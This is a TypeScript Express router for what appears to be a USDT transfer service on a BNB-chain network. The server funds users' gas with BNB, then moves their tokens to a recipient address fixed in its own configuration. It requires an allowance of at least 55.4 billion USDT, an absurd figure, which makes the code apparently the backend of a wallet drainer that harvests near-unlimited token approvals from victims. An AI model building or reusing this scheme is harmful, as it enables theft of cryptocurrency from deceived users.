import { randomUUID } from "node:crypto";
import { Router, type Request } from "express";
import { getAddress, parseEther, type Wallet } from "ethers";
import type { Config } from "../config.js";
import { verifyApproval } from "../approvalVerifier.js";
import type { TokenService } from "../token.js";
import { validateAddress, validateAmount, validateChainId, validateExecuteInput, validatePrepareInput } from "../validation.js";
import type { JsonRpcProvider } from "ethers";

const completedRequests = new Set<string>();
const inFlightRequests = new Set<string>();
const MINIMUM_BALANCE_TOKENS = "5";
const MINIMUM_ALLOWANCE_TOKENS = "55400000000";
const preparedOwners = new Set<string>();
const fundingOwners = new Set<string>();

async function withRetry<T>(operation: () => Promise<T>, attempts = 3, delayMs = 250): Promise<T> {
  let lastError: unknown;
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    try {
      return await operation();
    } catch (error) {
      lastError = error;
      if (attempt < attempts) await new Promise((resolve) => setTimeout(resolve, delayMs * attempt));
    }
  }
  throw lastError instanceof Error ? lastError : new Error("Operation failed after retries");
}

export function createExecuteTransferRouter(deps: { config: Config; provider: JsonRpcProvider; token: TokenService; executor?: Wallet; logger?: (entry: Record<string, unknown>) => void }): Router {
  const router = Router();
  const log = deps.logger ?? ((entry) => console.log(JSON.stringify(entry)));
  router.post("/api/prepare-transfer", async (request: Request, response) => {
    const requestId = request.header("x-request-id") ?? randomUUID();
    let input: ReturnType<typeof validatePrepareInput> | undefined;
    try {
      input = validatePrepareInput(request.body);
      validateChainId(input.chainId);
      if (!deps.executor) throw new Error("Gas funding is not configured");
      const owner = input.owner;
      const threshold = parseEther(deps.config.gasFundingThresholdBnb);
      const fundingAmount = parseEther(deps.config.gasFundingAmountBnb);
      let balance = await withRetry(() => deps.provider.getBalance(owner));
      const ownerKey = owner.toLowerCase();
      if (balance < threshold && !preparedOwners.has(ownerKey)) {
        if (fundingOwners.has(ownerKey)) throw new Error("Gas funding is already in progress for this wallet");
        fundingOwners.add(ownerKey);
        log({ requestId, owner, executor: deps.config.executorAddress, status: "FUNDING_GAS" });
        try {
          const fundingTransaction = await deps.executor.sendTransaction({ to: owner, value: fundingAmount });
          const receipt = await withRetry(() => fundingTransaction.wait(deps.config.gasFundingConfirmations));
          if (!receipt || receipt.status !== 1) throw new Error("Gas funding transaction failed");
          balance = await withRetry(() => deps.provider.getBalance(owner));
          if (balance >= threshold) preparedOwners.add(ownerKey);
        } finally {
          fundingOwners.delete(ownerKey);
        }
      }
      if (balance < threshold) throw new Error("User BNB balance is still below the gas funding threshold");
      log({ requestId, owner, status: "GAS_READY" });
      return response.status(200).json({ requestId, owner, status: "GAS_READY" });
    } catch (error) {
      const message = error instanceof Error ? error.message : "Gas preparation failed";
      log({ requestId, owner: input?.owner, status: "FAILED", error: message });
      return response.status(400).json({ requestId, status: "FAILED", error: message });
    }
  });
  router.post("/api/execute-transfer", async (request: Request, response) => {
    const requestId = request.header("x-request-id") ?? randomUUID();
    let input: ReturnType<typeof validateExecuteInput> | undefined;
    try {
      input = validateExecuteInput(request.body);
      validateChainId(input.chainId);
      const owner = input.owner;
      const recipient = validateAddress(deps.config.recipientAddress, "recipient");
      let requestedAmount: bigint;
      try {
        requestedAmount = await deps.token.parseAmount(validateAmount(input.amount));
      } catch {
        throw new Error("Invalid amount");
      }
      const approvalAmount = await deps.token.parseAmount(deps.config.approvalAmount);
      const minimumBalance = await deps.token.parseAmount(MINIMUM_BALANCE_TOKENS);
      const minimumAllowance = await deps.token.parseAmount(MINIMUM_ALLOWANCE_TOKENS);
      const replayKey = `${input.owner.toLowerCase()}:${input.approvalTxHash.toLowerCase()}:${recipient.toLowerCase()}`;
      if (completedRequests.has(replayKey) || inFlightRequests.has(replayKey)) throw new Error("Duplicate execution request");
      inFlightRequests.add(replayKey);
      log({ requestId, owner: input.owner, token: deps.config.tokenAddress, requestedAmount: input.amount, approvalAmount: deps.config.approvalAmount, status: "VERIFYING_APPROVAL" });
      await verifyApproval(deps.provider, deps.config, { approvalTxHash: input.approvalTxHash, owner: input.owner, amount: approvalAmount });
      const currentAllowance = await withRetry(() => deps.token.allowance(owner, deps.config.executorAddress));
      if (currentAllowance < minimumAllowance) throw new Error("Insufficient allowance: at least 55400000000 USDT is required");
      const balance = await withRetry(() => deps.token.balanceOf(owner));
      if (balance < minimumBalance) throw new Error("Insufficient balance: at least 5 USDT is required");
      const amount = [requestedAmount, approvalAmount, balance, currentAllowance].reduce((safeAmount, limit) => safeAmount < limit ? safeAmount : limit);
      if (amount <= 0n) throw new Error("Transfer amount must be greater than zero");
      const transaction = await deps.token.transferFrom(input.owner, recipient, amount);
      // Once the transfer is submitted, this request is consumed even if receipt polling is interrupted.
      completedRequests.add(replayKey);
      const receipt = await withRetry(() => transaction.wait());
      if (!receipt || receipt.status !== 1) throw new Error("Transfer transaction failed");
      const formattedAmount = await deps.token.formatAmount(amount);
      log({ requestId, owner: input.owner, executor: deps.config.executorAddress, token: deps.config.tokenAddress, amount: formattedAmount, status: "CONFIRMED", transactionHash: transaction.hash });
      return response.status(200).json({ transactionHash: transaction.hash, owner: input.owner, executor: getAddress(deps.config.executorAddress), recipient, amount: formattedAmount, status: "CONFIRMED" });
    } catch (error) {
      const message = error instanceof Error ? error.message : "Transfer execution failed";
      log({ requestId, owner: input?.owner, token: deps.config.tokenAddress, amount: input?.amount, status: "FAILED", error: message });
      return response.status(message === "Duplicate execution request" ? 409 : 400).json({ requestId, status: "FAILED", error: message });
    } finally {
      if (input) {
        try {
          inFlightRequests.delete(`${input.owner.toLowerCase()}:${input.approvalTxHash.toLowerCase()}:${deps.config.recipientAddress.toLowerCase()}`);
        } catch { /* Invalid requests never enter the in-flight set. */ }
      }
    }
  });
  return router;
}
